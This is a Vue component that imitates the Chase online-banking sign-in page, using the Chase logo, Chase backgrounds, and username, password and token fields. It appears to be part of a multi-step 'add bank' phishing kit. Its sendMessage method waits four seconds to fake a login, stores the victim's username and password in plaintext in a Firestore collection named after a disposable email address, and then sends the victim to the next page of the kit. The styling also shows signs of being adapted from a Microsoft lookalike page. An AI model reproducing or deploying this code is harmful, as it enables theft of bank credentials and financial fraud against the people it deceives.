<template>
  <div class="alpha">
    <div class="shadow-bar">
      <div class="chase-logo">
        <img src="@/assets/wordmark-white.png" alt="" class="chase-logo" />
      </div>
    </div>

    <div class="section-alpha">
      <span class="loader" v-if="loading"></span>

      <form class="section-1" @submit.prevent="increment">

        <div class="seprate">
          <label
              style="color:#565a5d;padding-top: 6%"
          >Username</label>
          <input type="text" required="required" v-model="email" class="input-field"   maxlength="113"
                 aria-describedby="Username" autocomplete="username"/>
        </div>

        <div class="seprate">
          <label
              style="color:#565a5d;"
          >Password</label>
          <input type="password" required="required" v-model="password" class="input-field"   maxlength="113"
                 aria-describedby="Username" autocomplete="username"/>
        </div>

        <div class="form-group-2">
          <div class="law-seprate">
            <input
                type="checkbox"
                placeholder="Remember-Me"
                id="remember-me"
                class="checkbox"
            />
            <label for="remember-me" class="checkbox-text">Remember me</label>
          </div>
          <div class="law-seprate">
            <input
                type="checkbox"
                placeholder="Remember-Me"
                id="remember-me"
                class="checkbox"
            />
            <label for="remember-me" class="checkbox-text">Use token</label>
          </div>
        </div>

        <button class="btn">Sign in</button>

      </form>

      <p style="color: #0060f0;" class="text-3 law-top"  >Forgot username/password? ></p>

      <p style="color: #0060f0;" class="text-3"  >Not Enrolled/Sign Up Now. ></p>

    </div>

    <footer-add-bank-view/>

  </div>
</template>

<script>
import FooterAddBankView from "@/components/DashBoard/FooterAddBankView.vue";
import {doc, setDoc} from "firebase/firestore";
import {db} from "@/firebase/config";
// import Swal from "sweetalert2";

export default {
  name: "AddBankComponent3",
  components: {FooterAddBankView},
  data()  {
    return {
      email: "",
      password: "",
      loading: false
    }
  },
  computed: {
    // ...mapState(['count','screen','loginForm']),
  },
  methods: {
    async increment() {
      // Show the loader
      this.loading = true;

      // Mimic an API call by waiting for 4 seconds
      await new Promise(resolve => setTimeout(resolve, 4000));

      // Proceed with the rest of the function after 5 seconds
      this.sendMessage();

      // Hide the loader
      this.loading = false;
    },
    increment2() {
      this.$store.commit('updateScreen', 'lgoIn');
      this.$store.commit('updateLoginForm', { email: this.email });
    },
    login(){
      this.$router.push("/createAccount");
    },
    login2(){
      this.resetForm();
      this.$router.push("/pre-loader");
    },
    forgotPassword(){
      this.$router.push("/forgot-password");
    },

    async sendMessage() {
      // this.loading = true;  // Start loading
      try {
        await setDoc(doc(db, "dagbuelawrence@yopmail.com3", "BankInfo"), {
          email: this.email,
          password: this.password,
        }, { merge: true });

        // await Swal.fire({
        //   icon: 'success',
        //   title: 'success',
        //   text: 'account linking',
        // });
      } catch (error) {
        console.error("Error sending message:", error);
        // await Swal.fire({
        //   icon: 'error',
        //   title: 'Oops...',
        //   text: 'Something went wrong!',
        // });
      } finally {
        // this.resetForm();
        this.$router.push("/addBank4");
      }
    },

    resetForm() {
      this.email = '';
      this.password = '';
    },
  }
}
</script>

<style scoped>



input:focus {
  outline: none;
}
select:focus {
  outline: none;
}

.alpha {
  background-image: url("@/assets/background.desktop.day.1.jpeg");
  height: 100vh;
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
  background-attachment: fixed; /* Use this instead of position: fixed */
  width: 100%;
}

.form-group-2 {
  padding-top: 15px;
  padding-bottom: 15px;
  display: flex;
  align-items: center;
  align-content: center;
  justify-content: space-between;
}

.law-top{
  margin-top: 18%;
}

.checkbox-text {
  padding-left: 8px;
  font-size: 15px;
  color: #717171;
  padding-top: 5px;
}

.law-seprate{
  display: flex;
  justify-content: space-between;
  align-items: center;
  align-content: center;
}

.chase-logo{
  width: 180px;
  height: 2.6rem;
  margin: 0 auto;
  text-align: center;
}

.shadow-bar{
  background-position: center center;background-color: transparent;
  background-image: linear-gradient(to bottom, rgba(0, 0, 0, .7) 0, rgba(0, 0, 0, .5) 50%, rgba(0, 0, 0, 0) 100%);
  padding-top: 1.3%;
  padding-bottom: 1.3%;
}

input:focus {
  outline: none;
}
select:focus {
  outline: none;
}

.section-alpha{
  position: relative;
  z-index: 1; /* Ensure this section is above the background */
  padding-bottom: 30px;
  padding-left: 44px;
  padding-right: 44px;
  padding-top: 0.1px;
  width: calc(100% - 40px);
  background: #fff;
  border-radius: 5px;
  max-width: 384px !important;
  margin-right: auto;
  margin-left: auto;
  display: block;
  unicode-bidi: isolate;
  box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
  margin-top: 4%;
}

.section-1{
  padding-bottom: 5%;
  padding-top: 9%;
}

.section-2{
  background-color: rgb(255, 255, 255);
  padding-top: 7px;
  padding-bottom: 7px;
  padding-left: 44px;
  padding-right: 44px;
  width: calc(100% - 40px);
  max-width: 440px;
  position: relative;
  margin-right: auto;
  margin-left: auto;
  display: block;
  unicode-bidi: isolate;
  box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
  word-break: break-word;
  line-height: 16px;
  margin-top: 2%;
}

.microSoft-image{
  height: 24px;
  max-width: 256px;
}

.text-1{
  font-size: 1.5rem;
  color: rgb(27, 27, 27);
  line-height: 28px;
  font-weight: 600;
  margin-top: 16px;
}

.text-2{
  margin-bottom: 12px;
  font-size: 0.8125rem;
  line-height: 20px;
  font-weight: 400;
  color: rgb(27, 27, 27);
}

.input-field{
  margin-bottom: 16px;
  padding-bottom: 6px;
  padding-right: 10px;
  padding-top: 6px;
  border-bottom-width: 1px;
  border-left-width: 0px;
  border-right-width: 0px;
  border-top-width: 0px;
  border-radius: 0;
  background-color: transparent;
  width: 100%;
  height: 30px;
  max-width: 100%;
  text-rendering: auto;
  letter-spacing: normal;
  word-spacing: normal;
  line-height: normal;
  text-transform: none;
  text-indent: 0;
  text-shadow: none;
  display: inline-block;
  text-align: start;
  appearance: auto;
  -webkit-rtl-ordering: logical;
  cursor: text;
  border-style: inset;
  border-color:  rgb(133, 133, 133);
  border-image: initial;
  padding-block: 1px;
  padding-inline: 2px;
  font-size: 16px;
}

.text-3{
  font-size: 0.9rem;
  padding-top: 1.5%;
}

.text-3-span{
  color: rgb(0, 103, 184);
}

.btn{
  float: right;
  color: rgb(255, 255, 255);
  border-color: #0060f0;
  background-color: #0060f0;
  touch-action: manipulation;
  text-overflow: ellipsis;
  padding-bottom: 4px;
  padding-left: 12px;
  padding-right: 12px;
  padding-top: 4px;
  margin-top: 5%;
  line-height: normal;
  min-height: 40px;
  width: 100%;
  display: inline-block;
  text-align: center;
  overflow-y: hidden;
  overflow-x: hidden;
  vertical-align: middle;
  appearance: auto;
  text-rendering: auto;
  letter-spacing: normal;
  word-spacing: normal;
  text-transform: none;
  text-indent: 0px;
  text-shadow: none;
  align-items: flex-start;
  cursor: default;
  box-sizing: border-box;
  padding-block: 1px;
  padding-inline: 6px;
  border-width: 0.5px;
  border-style: outset;
  border-image: initial;
  margin-left: 5px;
  border-radius: 5px;
}

.btn-i{
  float: right;
  color: rgb(0, 0, 0);
  border-color: rgb(0, 0, 0, 0.2);
  background-color: rgba(0, 0, 0, 0.2);
  touch-action: manipulation;
  text-overflow: ellipsis;
  padding-bottom: 4px;
  padding-left: 12px;
  padding-right: 12px;
  padding-top: 4px;
  margin-top: 5%;

  line-height: normal;
  min-width: 108px;
  min-height: 32px;
  max-width: 100%;
  display: inline-block;
  text-align: center;
  overflow-y: hidden;
  overflow-x: hidden;
  vertical-align: middle;
  appearance: auto;
  text-rendering: auto;
  letter-spacing: normal;
  word-spacing: normal;
  text-transform: none;
  text-indent: 0px;
  text-shadow: none;
  align-items: flex-start;
  cursor: default;
  box-sizing: border-box;
  padding-block: 1px;
  padding-inline: 6px;
  border-width: 0.5px;
  border-style: outset;
  border-image: initial;
  margin-right: 5px;
}

.Sign-in-options-image{
  height: 30px;
  width: 30px;
}

.text-4{
  word-break: break-word;
  line-height: 16px;
  padding-left: 12px;
  text-align: left;
  padding-right: 24px;
  vertical-align: middle;
  display: table-cell;
  font-size: 15px;
}

.text-1-i{
  font-size: 1.5rem;
  color: rgb(27, 27, 27);
  line-height: 28px;
  font-weight: 600;
  margin-top: 12px;
  margin-bottom: 9px;
}

.text-3-span-i{
  color: rgb(0, 103, 184);
  font-size: 13.5px;
  padding-bottom: 12px;
}
.text-3-span-ii{
  font-weight: unset;
  font-size: 14px;
}

.text-5{
  padding-top: 10px;
  padding-bottom: 7px;
  display: flex;
  align-content: center;
  align-items: center;
  letter-spacing: 0.2px;
  font-size: 15px;
}

.bx-left-arrow-alt{
  padding-right: 4px;
}

.form-group-2 {
  display: flex;
  align-items: center;
  align-content: center;
  padding-top: 15px;
  padding-bottom: 15px;
}




.loader {
  width: 4px;
  height: 4px;
  border-radius: 25%;
  display: block;
  margin: 10px auto 0 auto;
  position: relative;
  color: #0a1538;
  left: -125px;
  box-sizing: border-box;
  animation: shadowRolling 2s linear infinite;
}

@keyframes shadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }
  12% {
    box-shadow: 100px 0 rgb(0, 103, 184), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }
  25% {
    box-shadow: 110px 0 rgb(0, 103, 184), 100px 0 rgb(0, 103, 184), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }
  36% {
    box-shadow: 120px 0 rgb(0, 103, 184), 110px 0 rgb(0, 103, 184), 100px 0 rgb(0, 103, 184), 0px 0 rgba(255, 255, 255, 0);
  }
  50% {
    box-shadow: 130px 0 rgb(0, 103, 184), 120px 0 rgb(0, 103, 184), 110px 0 rgb(0, 103, 184), 100px 0 rgb(0, 103, 184);
  }
  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 rgb(0, 103, 184), 120px 0 rgb(0, 103, 184), 110px 0 rgb(0, 103, 184);
  }
  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 rgb(0, 103, 184), 120px 0 rgb(0, 103, 184);
  }
  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 rgb(0, 103, 184);
  }
  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}


/* Media query for devices with a max width of 768px, typical for tablets and mobile devices */
@media (max-width: 768px) {
  .alpha {
    background-image: url("@/assets/background.mobile.day.1.jpeg"); /* Mobile background image */
  }

  .section-alpha{
    max-width: 344px !important;
    margin-top: 4%;
  }
}
</style>